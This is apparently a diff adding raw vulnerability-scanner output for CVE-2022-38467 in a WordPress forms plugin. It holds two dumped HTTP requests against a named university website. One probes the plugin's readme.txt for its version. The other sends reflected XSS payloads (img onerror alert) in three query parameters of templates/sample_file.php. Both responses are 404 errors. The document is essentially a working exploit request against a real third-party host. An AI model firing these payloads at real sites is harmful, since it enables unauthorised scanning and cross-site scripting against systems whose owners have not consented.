@@ -1,0 +1,90 @@
+[CVE-2022-38467] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/wp-content/plugins/crm-perks-forms/readme.txt
+
+
+GET /wp-content/plugins/crm-perks-forms/readme.txt HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept-Encoding: gzip
+
+
+[CVE-2022-38467] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/wp-content/plugins/crm-perks-forms/readme.txt
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 536
+Age: 2
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:59 GMT
+Server: AmazonS3
+Via: 1.1 46a0017ecef439253017ac2cc1624646.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: rf7Qq43mshKEML2AlD5KoPcME2pozYooActWtt5eR9y7NR6RaTdjng==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<h1>404 Not Found</h1>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: 404.html</li>
+<li>RequestId: 2MP3SAEWT8QB0KK7</li>
+<li>HostId: YxdRLMd/aAVzUvW3shK65D57rdzxEKPJyx3UiJWW9mc17qEQteQvpJ6wrPjHiydr3UhSQnSn7/Q=</li>
+</ul>
+<h3>An Error Occurred While Attempting to Retrieve a Custom Error Document</h3>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: error.html</li>
+</ul>
+<hr/>
+</body>
+</html>
+
+[CVE-2022-38467] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/wp-content/plugins/crm-perks-forms/templates/sample_file.php?FirstName=<img%20src%20onerror=alert(document.domain)>&LastName=<img%20src%20onerror=alert(document.domain)>&%20Company=<img%20src%20onerror=alert(document.domain)>
+
+
+GET /wp-content/plugins/crm-perks-forms/templates/sample_file.php?FirstName=<img%20src%20onerror=alert(document.domain)>&LastName=<img%20src%20onerror=alert(document.domain)>&%20Company=<img%20src%20onerror=alert(document.domain)> HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept-Encoding: gzip
+
+
+[CVE-2022-38467] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/wp-content/plugins/crm-perks-forms/templates/sample_file.php?FirstName=<img%20src%20onerror=alert(document.domain)>&LastName=<img%20src%20onerror=alert(document.domain)>&%20Company=<img%20src%20onerror=alert(document.domain)>
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 536
+Age: 3
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:59 GMT
+Server: AmazonS3
+Via: 1.1 ef315c477bb47c8fcfecf9e0377b18b0.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: 25aI2UjT2n3DoSp3U2WMdUk2Lzd5-VlDGlfuSf9kfix8zZiaIqhI5A==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<h1>404 Not Found</h1>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: 404.html</li>
+<li>RequestId: 2MP3SAEWT8QB0KK7</li>
+<li>HostId: YxdRLMd/aAVzUvW3shK65D57rdzxEKPJyx3UiJWW9mc17qEQteQvpJ6wrPjHiydr3UhSQnSn7/Q=</li>
+</ul>
+<h3>An Error Occurred While Attempting to Retrieve a Custom Error Document</h3>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: error.html</li>
+</ul>
+<hr/>
+</body>
+</html>
+
